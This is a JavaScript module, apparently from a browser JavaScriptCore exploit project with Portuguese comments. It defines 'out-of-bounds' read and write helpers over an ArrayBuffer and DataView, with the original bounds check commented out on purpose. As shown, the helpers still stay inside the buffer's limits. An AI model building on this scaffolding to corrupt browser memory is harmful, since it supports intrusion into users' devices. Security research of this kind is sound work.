// js/core_exploit.mjs
import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex, DataViewUtils } from './utils.mjs';
import { logS3 as currentLog } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null; // Esta é a "janela" DataView, não necessariamente corrompida por padrão

const toHexHelper = (val, bits = 32) => toHex(val, bits);

export function clearOOBEnvironment() {
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment';
    currentLog(`Limpando ambiente OOB...`, 'info', FNAME_CLEAR);
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    currentLog(`Ambiente OOB limpo.`, 'good', FNAME_CLEAR);
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}
export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}

// Esta função configura o oob_array_buffer_real (buffer grande)
// e o oob_dataview_real (uma view "normal" sobre uma parte desse buffer).
// Para uma exploração OOB real, o oob_dataview_real precisaria ser
// uma view cujos metadados (ponteiro de buffer ou tamanho) foram corrompidos.
export function triggerOOB_primitive() {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    // currentLog(`--- Iniciando CoreExploit.triggerOOB_primitive ---`, 'test', FNAME_TRIGGER); // Log menos verboso

    const allocationSize = getOOBAllocationSize();
    const baseOffset = getBaseOffsetInDV();

    // currentLog(`    Config OOB: Alloc Size: ${allocationSize}, Base Offset in DV: ${baseOffset}`, 'info', FNAME_TRIGGER);

    if (oob_array_buffer_real && oob_dataview_real) {
        // Verificar se os tamanhos ainda correspondem à configuração, caso contrário, recriar
        if (oob_array_buffer_real.byteLength === (baseOffset + allocationSize + 256) &&
            oob_dataview_real.byteOffset === baseOffset &&
            oob_dataview_real.byteLength === allocationSize) {
            // currentLog("    Ambiente OOB já existe e corresponde à config. Reutilizando.", "info", FNAME_TRIGGER);
            return true;
        }
        currentLog("    Ambiente OOB existe, mas não corresponde à config. Recriando.", "warn", FNAME_TRIGGER);
        clearOOBEnvironment(); // Forçar recriação se config mudou ou para garantir estado limpo
    }

    try {
        const realBufferSize = baseOffset + allocationSize + 256;
        oob_array_buffer_real = new ArrayBuffer(realBufferSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, baseOffset, allocationSize);

        // currentLog(`    oob_array_buffer_real criado com tamanho: ${oob_array_buffer_real.byteLength}`, 'good', FNAME_TRIGGER);
        // currentLog(`    oob_dataview_real criado. Offset: ${oob_dataview_real.byteOffset}, Length: ${oob_dataview_real.byteLength}`, 'good', FNAME_TRIGGER);
        // currentLog(`--- CoreExploit.triggerOOB_primitive CONCLUÍDO ---`, 'test', FNAME_TRIGGER);
        return true;

    } catch (e) {
        currentLog(`ERRO em triggerOOB_primitive: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        oob_array_buffer_real = null;
        oob_dataview_real = null;
        return false;
    }
}

// Esta função escreve no oob_array_buffer_real.
// Para a Estratégia 2 (corromper vítima adjacente), queremos permitir que
// absolute_offset_in_real_ab seja MAIOR que oob_array_buffer_real.byteLength.
// No entanto, a DataView criada aqui (temp_dv) ainda estará vinculada ao tamanho
// do oob_array_buffer_real. Se o offset estiver fora, a DataView lançará RangeError.
export function oob_write_absolute(absolute_offset_in_real_ab, value, size_in_bytes = 4) {
    const FNAME_WRITE = "CoreExploit.oob_write_absolute";
    if (!oob_array_buffer_real) {
        currentLog("ERRO: oob_array_buffer_real não inicializado!", "critical", FNAME_WRITE);
        return false;
    }

    // ----- INÍCIO DA MODIFICAÇÃO -----
    // Verificação de limites original comentada para permitir tentativas de escrita OOB.
    /*
    if (absolute_offset_in_real_ab < 0 || absolute_offset_in_real_ab + size_in_bytes > oob_array_buffer_real.byteLength) {
        currentLog(`ERRO: Escrita OOB fora dos limites REAIS! Offset: ${toHexHelper(absolute_offset_in_real_ab)}, Size: ${size_in_bytes}, Buffer Size: ${oob_array_buffer_real.byteLength}`, "critical", FNAME_WRITE);
        return false;
    }
    */

    // Adicionar um log se a tentativa for realmente fora dos limites do buffer base
    if (absolute_offset_in_real_ab < 0 || absolute_offset_in_real_ab + size_in_bytes > oob_array_buffer_real.byteLength) {
        currentLog(`AVISO: Tentando escrita que seria OOB para o 'oob_array_buffer_real' (Offset: ${toHexHelper(absolute_offset_in_real_ab)}, TamBuffer: ${oob_array_buffer_real.byteLength}). A DataView interna provavelmente lançará RangeError.`, "warn", FNAME_WRITE);
    }
    // ----- FIM DA MODIFICAÇÃO -----

    // A DataView criada aqui está vinculada aos limites de oob_array_buffer_real.
    // Se absolute_offset_in_real_ab estiver fora desses limites, as operações .set* abaixo
    // lançarão um RangeError.
    const temp_dv = new DataView(oob_array_buffer_real);
    try {
        if (size_in_bytes === 1) {
            temp_dv.setUint8(absolute_offset_in_real_ab, Number(value));
        } else if (size_in_bytes === 2) {
            temp_dv.setUint16(absolute_offset_in_real_ab, Number(value), true);
        } else if (size_in_bytes === 4) {
            temp_dv.setUint32(absolute_offset_in_real_ab, Number(value), true);
        } else if (size_in_bytes === 8 && isAdvancedInt64Object(value)) {
            DataViewUtils.writeUint64(temp_dv, absolute_offset_in_real_ab, value);
        } else if (size_in_bytes === 8 && typeof value === 'number') { // Tentativa de escrita de 64-bit de um número JS
             DataViewUtils.writeUint64(temp_dv, absolute_offset_in_real_ab, new AdvancedInt64(value));
        }
        else {
            currentLog(`ERRO: Tamanho de escrita não suportado ou tipo de valor inválido: ${size_in_bytes}`, "error", FNAME_WRITE);
            return false; // Não foi possível determinar como escrever
        }
        // Se chegou aqui, a escrita ocorreu DENTRO dos limites que a temp_dv permite (ou seja, dentro do oob_array_buffer_real)
        // currentLog(`Escrito ${isAdvancedInt64Object(value) ? value.toString(true) : toHexHelper(value, size_in_bytes*8)} em offset abs ${toHexHelper(absolute_offset_in_real_ab)} (Size: ${size_in_bytes})`, "info", FNAME_WRITE);
        return true; // Escrita bem-sucedida (dentro dos limites da DataView)
    } catch (e) {
        // Se um RangeError ocorreu, é porque absolute_offset_in_real_ab estava fora dos limites
        // do oob_array_buffer_real para a operação da DataView.
        currentLog(`EXCEÇÃO durante oob_write_absolute (Offset: ${toHex(absolute_offset_in_real_ab)}, TamBuffer: ${oob_array_buffer_real.byteLength}): ${e.name} - ${e.message}`, "error", FNAME_WRITE);
        if (e.name === "RangeError") {
            currentLog("   RangeError capturado: A tentativa de escrita estava fora dos limites do buffer para a DataView.", "vuln", FNAME_WRITE);
        }
        return false; // A escrita falhou
    }
}

// A leitura também usa uma DataView vinculada ao oob_array_buffer_real.
// Se o offset estiver fora, lançará RangeError.
export function oob_read_absolute(absolute_offset_in_real_ab, size_in_bytes = 4) {
    const FNAME_READ = "CoreExploit.oob_read_absolute";
    if (!oob_array_buffer_real) {
        currentLog("ERRO: oob_array_buffer_real não inicializado!", "critical", FNAME_READ);
        return undefined;
    }

    // Log de aviso se a tentativa for realmente fora dos limites do buffer base
    if (absolute_offset_in_real_ab < 0 || absolute_offset_in_real_ab + size_in_bytes > oob_array_buffer_real.byteLength) {
        currentLog(`AVISO: Tentando leitura que seria OOB para o 'oob_array_buffer_real' (Offset: ${toHexHelper(absolute_offset_in_real_ab)}, TamBuffer: ${oob_array_buffer_real.byteLength}). A DataView interna provavelmente lançará RangeError.`, "warn", FNAME_READ);
    }

    const temp_dv = new DataView(oob_array_buffer_real);
    try {
        let val;
        if (size_in_bytes === 1) {
            val = temp_dv.getUint8(absolute_offset_in_real_ab);
        } else if (size_in_bytes === 2) {
            val = temp_dv.getUint16(absolute_offset_in_real_ab, true);
        } else if (size_in_bytes === 4) {
            val = temp_dv.getUint32(absolute_offset_in_real_ab, true);
        } else if (size_in_bytes === 8) {
            val = DataViewUtils.readUint64(temp_dv, absolute_offset_in_real_ab);
        } else {
            currentLog(`ERRO: Tamanho de leitura não suportado: ${size_in_bytes}`, "error", FNAME_READ);
            return undefined;
        }
        return val;
    } catch (e) {
        currentLog(`EXCEÇÃO durante oob_read_absolute (Offset: ${toHex(absolute_offset_in_real_ab)}, TamBuffer: ${oob_array_buffer_real.byteLength}): ${e.name} - ${e.message}`, "error", FNAME_READ);
        if (e.name === "RangeError") {
            currentLog("   RangeError capturado: A tentativa de leitura estava fora dos limites do buffer para a DataView.", "vuln", FNAME_READ);
        }
        return undefined;
    }
}

export async function selfTestOOBReadWrite() {
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog("--- Iniciando Auto-Teste de Leitura/Escrita OOB ---", "test", FNAME_TEST);

    if (!triggerOOB_primitive()) {
        currentLog("Falha ao inicializar ambiente OOB para auto-teste.", "critical", FNAME_TEST);
        return;
    }

    const safe_relative_offset = 16;
    const safe_abs_offset = getBaseOffsetInDV() + safe_relative_offset;

    if (safe_abs_offset + 16 > oob_array_buffer_real.byteLength) {
         currentLog("ERRO: Offset de teste excede o tamanho do oob_array_buffer_real. Ajuste config.", "critical", FNAME_TEST);
         return;
    }

    const test_val32 = 0x12345678;
    const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFFAA00);

    currentLog(`Escrevendo ${toHexHelper(test_val32)} em offset absoluto ${toHexHelper(safe_abs_offset)}`, "info", FNAME_TEST);
    if (oob_write_absolute(safe_abs_offset, test_val32, 4)) {
        const read_val32 = oob_read_absolute(safe_abs_offset, 4);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST);
        }
    } else {
         currentLog(`FALHA ao escrever valor de teste 32bit.`, "error", FNAME_TEST);
    }


    const next_abs_offset = safe_abs_offset + 4;
    currentLog(`Escrevendo ${test_val64.toString(true)} em offset absoluto ${toHexHelper(next_abs_offset)}`, "info", FNAME_TEST);
    if (oob_write_absolute(next_abs_offset, test_val64, 8)) {
        const read_val64 = oob_read_absolute(next_abs_offset, 8);
        if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
        } else {
            const readValStr = isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64);
            currentLog(`FALHA: Lido ${readValStr}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST);
        }
    } else {
        currentLog(`FALHA ao escrever valor de teste 64bit.`, "error", FNAME_TEST);
    }
    currentLog("--- Auto-Teste de Leitura/Escrita OOB CONCLUÍDO ---", "test", FNAME_TEST);
}
